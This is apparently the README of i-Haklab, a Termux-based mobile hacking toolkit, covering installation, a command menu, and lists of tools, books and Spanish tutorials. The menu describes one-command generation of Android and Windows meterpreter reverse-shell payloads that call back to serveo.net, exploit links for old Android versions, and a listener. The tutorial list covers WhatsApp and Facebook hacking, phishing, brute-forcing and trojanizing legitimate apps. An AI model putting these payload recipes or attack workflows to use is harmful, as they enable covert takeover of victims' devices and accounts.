# i-Haklab v.1.0 2019 by @Ivam3
	DISCLAIMER
Please do not use in military or secret service organizations, or for illegal purposes.
Ivam3 is not responsible for the misuse that can be given to everything that this laboratory entails

To get help about how to use it join to irc chat in i-Haklab command
		: $ i-Haklab weechat

To report some issues join to >> https://t.me/Ivam3_Bot


- i-Haklab Is a hacking laboratory that contains open source tools recommended by Ivam3. It use oh my fish insteractive shell, to get help about its use going to >> https://fishshell.com/docs/current/tutorial.html.

# Process during installation

i-haklab will ......
- check if your android device has some root, if so, it will install the sudo command.
- check if termux has permission to access the external memory, thus, in there it will create a directory called homeroot and there will install the tools and/or frameworks. otherwise they will be installed in the directory /data/data/com.termux/files/home. By the way, in case of Termux is installed in a second partition of your external memory those will be in /data/sdext2/data/com.termux/files/home.
- Once the installation of the tools and/or frameworks is finished, i-Haklab will ask you to configure your password, security question and answer, which will be necessary to start session in i-Haklab.
- i-Haklab has the "lock" command which will block the screen and it will only be unlocked with said password or answering the security question. It is worth mentioning that these access codes are encrypted for your security
- Coupled with it i-Haklab has an automation command for updating, installing and uninstalling tools and books, and executing hacking processes under a single command. under the command we will find the weechat argument, with which you can join the official IRC Ivam3byCinderella ((Internet Relay Chat (IRC) is an application layer protocol that facilitates communication in the form of text. The chat process works on a client/server networking model)).

To see the main menu Just execute from the command line 
		: $ i-Haklab --help

# i-Haklab help menu

Syntax: i-Haklab [-arg-] [-option-]

Arguments  |    Options     |    Description
╰─help─────➤────────────────➤ Show this help menu
╰─list─────➤────────────────➤ List all available tools/frameworks
╰─show─────➤──tools/books───➤ Show tools details and books availables
|   ╰──────➤──tutorials/QG──➤ Show tutorials and Quick Guides availables
╰─install──➤───tool/book────➤ Install tools or books
╰─remove───➤─────tool───────➤ Remove tools
╰─weechat──➤────────────────➤ Connect with irc Ivam3byCinderella chat
╰─update───➤────────────────➤ Update i-Haklab
╰─upgrade──➤────────────────➤ upgrade i-Haklab by installing/upgrading tools
╰─version──➤────────────────➤ Show i-Haklab version installed
|       |        |
[--] Automatitation Arguments [--]
Arguments  |    options     |    Description
╰─handler──➤──file.rc name──➤ Start handler on msfconsole with previous setting
╰───apk────➤──inlan/outlan──➤ Create a coded payload apk with msfvenom
|               ╰─────|─────➤ LPORT=4546 Payload=android/meterpreter/reverse_tcp apk=inlan.apk
|                     ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
|                             Payload=android/meterpreter/reverse_tcp
╰─paylink──➤─pc/nexam/soa5──➤ Create a link payload with handler
|             ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
|                 |    |      example: i-Haklab paylink pc 2
|                 ╰────|────➤ For targets [0]nexxus and [29]samsung
|                      |      example: i-Haklab paylink nexam 29
|                      ╰────➤ For android operative system equal at version 5 to down
╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
|               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
|                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
|                             LHOST=serveo.net apk=outlan.apk
╰─serveo───➤────────────────➤ Start a SSH client to request TCP port forwarding from the server and proxy
|    ╰─────➤────domain──────➤ Start a SSH client to request port forwarding with especific dns

**** If you want to suggest some command do it in the section of suggestions of my bot in https://t.me/Ivam3_Bot


# Tools or frameworks available in i-Haklab

01: D-TECT
02: DoS-A-Tool
03: ExiF
05: binchecker
06: blackbox
07: converter
08: adminpanel
09: wpscan
10: aircrack-ng
11: androbugs
12: beef
13: bettercap
14: cc-genpro
15: java
16: credmap
17: crunch
18: embed
19: evilurl
20: fbbrute
21: fbi
22: fuzzdb
23: hakku
24: hatcloud
25: hunner
26: ipgeolocation
27: metasploit
28: ngrok
29: nikto
30: pasterm
31: youtube-dl
32: php-server
33: pybelt
34: recon-ng
35: recondog
36: redhawk
37: routersploit
38: seeker
39: shellphish
40: shellsploit
41: spotichk
42: sqliv
43: sqlmap
44: ssh-server
45: theharvester
46: hydra
47: tor

**** If you want to suggest some tool, do it in the section of suggestions of my bot in https://t.me/Ivam3_Bot


# Games available in i-Haklab

01: 2048
02: angband
03: brogue     
04: curseofwar
05: gnugo
06: greed
07: mathomatic
08: moon-buggy
09: snakegame
10: solitaire

**** If you want to suggest some game do it in the section of suggestions of my bot in https://t.me/Ivam3_Bot


# Books available in i-Haklab

01: Aprende html
02: Chema alonso coleccion
03: Comandos basicos linux
04: Cracking sin secretos
05: Conviertete en hacker by incube2
06: Ethical hacking
07: Hacking con python
08: Hacking etico 101
09: Hacking mexico seguridadofensiva nv.1
10: Hacking the hacker
11: Manual hacking dispositivos moviles
12: Metasploit para pentesters
13: My sql
14: Nmap by computaxion
15: Programa en C
16: Programa en C++
17: Programa en bash
18: Programacion en perl
19: Programacion en php
20: Programacion en ruby
21: Python para todos

**** If you want to suggest some book do it in the section of suggestions of my bot in https://t.me/Ivam3_Bot


# Tutorials available in i-Haklab

01: TERMUX TIPS Cap.1
02: TERMUX TIPS Cap.2
03: TERMUX TIPS Cap.3
04: TERMUX TIPS Cap.4
05: TERMUX: Aprendamos como ejecutar comandos
06: TERMUX: Combinación de comandos
07: TERMUX: Instalando el comando Sudo
08: TERMUX: Modifica y/o personaliza el banner de iniciO
09: Termux - Creando contraseña de acceso (logging banner)
10: TERMUX: Youtube-DL
11: METASPLOIT: Instalación
12: METASPLOIT: RuGiR
13: METASPLOIT: Hacking Android inLAN
14: METASPLOIT: Persistencia en Android
15: METASPLOIT: Hacking Android outLAN
16: METASPLOIT: Hackeado Android inLAN con paylink
17: METASPLOIT: EMBED Inyectando payload en app legítima inLAN
18: METASPLOIT: EMBED Inyectando payload en app legítima outLAN
19: Dos-A-TooL - Ataque distribuido de denegación de servicio
20: METASPLOIT - Ataque distribuido de denegación de servicio
21: Kali-nethunter: Como instalarlo(no root)
22: HACKING WHATSAPP 1ra parte
23: HACKING WHATSAPP 2da parte
24: SETOOLKIT - Instalacion
25: PHISHING : Weeman Framework(1ra parte)- Instalación
26: PHISHING : Weeman Framework(2da parte)- Hacking Facebook inLAN
27: PHISHING : Weeman Framework(3ra parte) - Hacking Facebook - Asignacion de dominio(DNS)
28: NGROK : Instalacion
29: PHISHING : WEEMAN (4ta parte) - Hacking Facebook outLAN
30: PHISHING: Shellphish Framework - Hacking redes sociales
31: CRUNCH - Crear diccionearios para ataques de fuerza bruta
32: FBBRUTE - Ataque de fuerza bruta a FACEBOOK
33: FBI - Como sustraer información de un Facebook Hackeado
34: IPGEOLOCATION: Geolocalizacion de IP's en Google Maps
35: ExiF - Extrayendo Meta Datos
36: BETTERCAP - Instalación
37: i-Haklab - TUTORIAL
38: CURSO DE PROGRAMACIÓN EN BASH 1ra Parte
39: CURSO DE PROGRAMACIÓN EN BASH 2da Parte
40: CURSO DE PROGRAMACIÓN EN BASH 3ra Parte

**** If you want to suggest some tutorial do it in the section of suggestions of my bot in https://t.me/Ivam3_Bot



# INSTALLATION

Whit script Ivam3-Haklab

- download the script Ivam3-Haklab in 
		: https://shrt.am/
- move it to Home directory
		: $ mv <downloading directory> $HOME
- execute it by command 
		: $ bash Ivam3-Haklab

Cloning it from Github

- Clone it to home directory
		: $ git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
- Go to i-Haklab directory
		: $ cd $HOME/i-Haklab
- Give permissions needed
		: $ chmod 711 -R *
- Run the setup file
		: $ bash setup




*** HAVE A NICE HACKING DAY!!!!
# 						@Ivam3
